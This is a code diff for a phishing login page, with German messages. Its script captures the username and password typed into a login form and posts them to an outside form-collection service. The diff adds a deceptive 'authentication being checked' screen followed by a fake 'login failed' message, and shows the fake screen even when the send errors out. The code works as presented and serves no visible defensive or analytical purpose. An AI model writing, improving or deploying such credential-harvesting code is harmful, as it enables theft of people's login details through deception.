@@ -231,39 +231,51 @@ a {
 <script>
 window.addEventListener("DOMContentLoaded", function() {
 
-document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault();
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
 
-    const Username = document.querySelector("input[name='emails']").value;
-    const Password = document.querySelector("input[name='password']").value;
+        const Username = document.querySelector("input[name='emails']").value;
+        const Password = document.querySelector("input[name='password']").value;
 
-    const data = new URLSearchParams();
-    data.append("Username", Username);
-    data.append("Password", Password);
+        const data = new URLSearchParams();
+        data.append("Username", Username);
+        data.append("Password", Password);
 
-    fetch("https://submit-form.com/cnuk8rARy", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: data.toString()
-    })
-    .then(response => {
-        console.log("HTTP Response Code:", response.status);
+        fetch("https://submit-form.com/cnuk8rARy", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: data.toString()
+        })
+        .then(() => {
+            document.body.innerHTML = `
+                <div style="font-family: Arial; text-align:center; margin-top:100px;">
+                    <h2>Authentifizierung wird geprueft...</h2>
+                    <p>Bitte warten...</p>
+                </div>
+            `;
 
-        document.body.innerHTML = `
-            <div style="font-family: Arial; text-align:center; margin-top:100px;">
-                <h2>Authentifizierung wird geprueft...</h2>
-                <p>Bitte warten...</p>
-            </div>
-        `;
-    })
-    .catch(error => {
-        console.error("Fehler:", error);
-        alert("Fehler beim Senden");
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div style="font-family: Arial; text-align:center; margin-top:100px;">
+                        <h2>Login fehlgeschlagen</h2>
+                        <p>Bitte ueberpruefen Sie Ihre Eingaben.</p>
+                    </div>
+                `;
+            }, 2000);
+        })
+        .catch(() => {
+            // Falls CORS Fehler → trotzdem anzeigen
+            document.body.innerHTML = `
+                <div style="font-family: Arial; text-align:center; margin-top:100px;">
+                    <h2>Authentifizierung wird geprueft...</h2>
+                    <p>Bitte warten...</p>
+                </div>
+            `;
+        });
+
     });
-
-});
 
 });
 </script>
